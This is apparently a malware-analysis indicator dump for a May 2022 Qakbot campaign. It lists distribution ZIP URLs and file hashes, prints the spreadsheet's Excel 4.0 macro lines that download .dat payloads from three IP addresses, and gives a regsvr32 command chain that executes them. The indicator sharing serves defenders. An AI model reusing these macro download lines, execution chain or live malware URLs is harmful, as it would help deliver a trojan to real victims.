@@ -1,0 +1,61 @@
+05.05.2022 | Qakbot | obama182 | Campaign 1651246804 | Version 403.573
+
+******************************
+
+.url https://tritechinfo.com/par/mOFsZNBB1P.zip
+.url https://lksoon.com/par/s/g2wxyLb4j.zip
+.url https://wsmprastreo.com.mx/par/S/JiLL8kFqO.zip
+.url https://formulasolutions.ro/par/h/9HS7SRQwU.zip
+.zip d7b86bd5b6d01d6209c575a6c84852fc2dcba8d5da0170cd1c1e21763c4ef68d
+.xls 93eef024ef7904bd7a65d5b2a8e3e199b3a0af26aace0884ca6b9070f3f56a60
+.dll b2836b4f7e90321048bbd5a6b6d61877efec98631d6357672fff9ff933f88253
+.dll c7c420b02b00e4a8abfb23baed70bfa3051821d5405f3183926768acd4517971
+.dll e941c28da1fca27de32514686e3c5dfa6fbc713764d16715bd285534bd983fd3
+.dll 2e568648636c1fbb913e2ec44daa161127686b41adaaf076aa23534e85571e16
+.dll b660a1f7a7d88cb931721e680c9911a28e83dbc6120eae3cd2875fad107206f4
+
+******************************
+
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Merto", 0)
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Merto\Byrost", 0)
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTP://144.217.60.52/44686.6975186343.dat", "C:\Merto\Byrost\Veonse.OOOCCCXXX")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTP://77.91.72.75/44686.6975186343.dat", "C:\Merto\Byrost\Veonsea.OOOCCCXXX")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTP://91.234.254.233/ 44686.6975186343.dat", "C:\Merto\Byrost\Veonseb.OOOCCCXXX")
+
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Merto", 0)
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Merto\Byrost", 0)
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTP://144.217.60.52/44686.6975622685.dat", "C:\Merto\Byrost\Veonse.OOOCCCXXX")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTP://77.91.72.75/44686.6975622685.dat", "C:\Merto\Byrost\Veonsea.OOOCCCXXX")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTP://91.234.254.233/ 44686.6975622685.dat", "C:\Merto\Byrost\Veonseb.OOOCCCXXX")
+
+HTTP://144.217.60.52/44686.6975186343.dat
+HTTP://77.91.72.75/44686.6975186343.dat
+HTTP://91.234.254.233/44686.6975186343.dat
+
+HTTP://144.217.60.52/44686.6975622685.dat
+HTTP://77.91.72.75/44686.6975622685.dat
+HTTP://91.234.254.233/44686.6975622685.dat
+
+******************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\Cancellation-1541944530$-May5.xlsb
+
+regsvr32 /s calc
+
+regsvr32 C:\Merto\Byrost\Veonse.OOOCCCXXX
+
+regsvr32 C:\Merto\Byrost\Veonsea.OOOCCCXXX
+
+regsvr32 C:\Merto\Byrost\Veonseb.OOOCCCXXX
+
+*************************************************
+
+https://tria.ge/220505-r383rababk
+
+
+*************************************************
+
+c2's
+
